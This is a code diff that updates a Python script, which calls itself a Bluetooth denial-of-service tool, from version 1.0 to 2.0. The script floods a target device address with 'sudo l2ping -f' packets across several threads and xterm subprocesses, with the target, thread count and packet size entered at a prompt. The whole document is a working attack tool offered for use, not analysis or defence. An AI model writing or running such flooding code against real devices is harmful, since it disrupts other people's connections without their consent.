@@ -1,44 +1,57 @@
 #About: Script that uses l2ping to flood a device to interupt their bluetooth connection.
-#Version: 1.0
+#Version: 2.0
+#Date: 11-02-2024
 import os
-import sys
-import time
 import subprocess
-import keyboard
-from threading import Thread
+import concurrent.futures
 
-abort_attack = False
+active = True
 
-def createThreads(address, bulletSize, guns):
-    threads = []
-    for i in range(guns):
-        t = Thread(target=attack, args=(address, bulletSize))
-        t.start()
-        threads.append(t)
-    return threads
+def clear():
+     os.system('clear')
+     print('l2ping Bluetooth DOS')
+     return
+     
 
-def attack(address, bulletSize):
-    while not abort_attack:
-        subprocess.run(["sudo", "l2ping", "-s", bulletSize, "-f", address])
+def worker(address, packet_size):
+        process = subprocess.Popen(["xterm", "-e","sudo l2ping -s " + packet_size + " -f " + address])
+        return process
 
-def stopThreads(threads):
-    global abort_attack
-    abort_attack = True
-    for t in threads: 
-        t.join()
+def attack(address, threadnum, packet_size):
+    processes = []
+    threadnum = int(threadnum)
+    print("Creating threads and subprocesses:")
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        for i in range(threadnum):
+            print(f"Creating thread #{i + 1}")
+            future = executor.submit(worker, address, packet_size)
+            print(f"Creating process #{i + 1}")
+            process = future.result()
+            processes.append(process)
+        print("Attack underway...")
+    return processes
 
 def main():
-    print("Bluetooth Denial of Service")
-    address = input("Enter the device address: ")
-    address.strip()
-    if len(address) != 17:
-        print("Invalid address.")
-        input("Press enter to continue...")
-        return
-    bulletSize = input("Enter bullet size: ")
-    guns = min(int(input("How many guns do you want to use? ")), 10)
-    createThreads(address, bulletSize, guns)
-    keyboard.wait('q')
+
+    global active
+
+    clear()
+    address = input("What is the target adress? ")
+    threadnum = input("How many threads would you like to use? ")
+    packet_size = input("What size packets would you like to send? ")
+
+    clear()
+    print()
+    processes = attack(address, threadnum, packet_size)
+    print()
+    input("Press enter to stop attack.")
+    for process in processes:
+         process.terminate()
+
+    clear()
+    print()
+    print("Attack completed.")
+    input("Press enter to quit...")
     return
 
 main()
